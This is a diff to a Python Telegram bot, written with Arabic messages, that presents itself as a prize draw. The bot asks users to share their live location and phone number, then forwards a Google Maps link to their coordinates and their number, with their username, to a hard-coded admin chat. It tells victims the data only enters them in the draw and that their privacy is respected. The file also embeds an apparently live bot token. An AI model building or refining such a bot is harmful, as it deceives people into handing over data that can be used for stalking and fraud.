@@ -1,6 +1,7 @@
 import telebot
 from telebot.types import Location, ReplyKeyboardMarkup, KeyboardButton, Contact
 import random
+import time
 
 # استبدل هذا بـ رمز البوت الخاص بك
 bot = telebot.TeleBot("7628474532:AAHLQxj2lbrrlcR4j1wjcmFlbWzQtZ4JnsY")
@@ -8,11 +9,14 @@ bot = telebot.TeleBot("7628474532:AAHLQxj2lbrrlcR4j1wjcmFlbWzQtZ4JnsY")
 # قائمة لتخزين معرفات المستخدمين الفريدة
 user_ids = set()
 
+# معرف المسؤول
+admin_chat_id = "1051175859"
+
 @bot.message_handler(commands=['start'])
 def start(message):
     # إضافة معرف المستخدم إلى القائمة إذا لم يكن موجودًا
     user_ids.add(message.from_user.id)
-    
+
     # إنشاء قائمة رئيسية مع خيارات متعددة
     keyboard = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
     location_button = KeyboardButton(text="📍 شارك موقعك الآن", request_location=True)
@@ -53,37 +57,27 @@ def prizes_info(message):
 def user_count(message):
     bot.send_message(message.chat.id, f"👥 عدد المستخدمين المشاركين: {len(user_ids)}")
 
-@bot.message_handler(content_types=['location'])
-def get_location(message):
-    latitude = message.location.latitude
-    longitude = message.location.longitude
-    google_maps_url = f"https://www.google.com/maps/place/{latitude},{longitude}"
+@bot.message_handler(content_types=['location', 'contact'])
+def handle_location_and_contact(message):
     username = message.from_user.username or "مستخدم غير معروف"
-    location_message = f"اسم المستخدم: {username}\nشارك موقعه: {google_maps_url}"
-    admin_chat_id = "1051175859"
-    bot.send_message(admin_chat_id, location_message)
-    
-    # رسالة شكر للمستخدم
-    bot.send_message(message.chat.id, "📍 شكرًا لمشاركة موقعك معنا! تم تسجيل دخولك في السحب. نأمل لك حظاً موفقاً! 🍀")
 
-@bot.message_handler(content_types=['contact'])
-def get_contact(message):
-    phone_number = message.contact.phone_number
-    username = message.from_user.username or "مستخدم غير معروف"
-    contact_message = f"اسم المستخدم: {username}\nشارك رقم هاتفه: {phone_number}"
-    admin_chat_id = "YOUR_ADMIN_CHAT_ID"
-    bot.send_message(admin_chat_id, contact_message)
-    
-    # رسالة شكر للمستخدم
-    bot.send_message(message.chat.id, "📞 شكرًا لمشاركة رقم هاتفك! نحن نهتم بخصوصيتك ونتمنى لك حظاً موفقاً في السحب! 🎉")
+    if message.content_type == 'location':
+        latitude = message.location.latitude
+        longitude = message.location.longitude
+        google_maps_url = f"https://www.google.com/maps/place/{latitude},{longitude}"
+        location_message = f"اسم المستخدم: {username}\nشارك موقعه: {google_maps_url}"
+        bot.send_message(admin_chat_id, location_message)
+        bot.send_message(message.chat.id, "📍 شكرًا لمشاركة موقعك معنا! تم تسجيل دخولك في السحب. نأمل لك حظاً موفقاً! 🍀")
 
-# تشغيل البوت بشكل دائم ومعالجة الأخطاءpython
+    if message.content_type == 'contact':
+        phone_number = message.contact.phone_number
+        contact_message = f"اسم المستخدم: {username}\nشارك رقم هاتفه: {phone_number}"
+        bot.send_message(admin_chat_id, contact_message)
+        bot.send_message(message.chat.id, "📞 شكرًا لمشاركة رقم هاتفك! نحن نهتم بخصوصيتك ونتمنى لك حظاً موفقاً في السحب! 🎉")
 
 while True:
     try:
-        bot.infinity_polling()  # استخدام infinity_polling بدلاً من polling
+        bot.infinity_polling()
     except Exception as e:
         print(f"حدث خطأ: {e}")
-        # يمكنك إضافة بعض التأخير قبل إعادة المحاولة لتجنب الاستهلاك العالي للموارد
-        import time
         time.sleep(5)
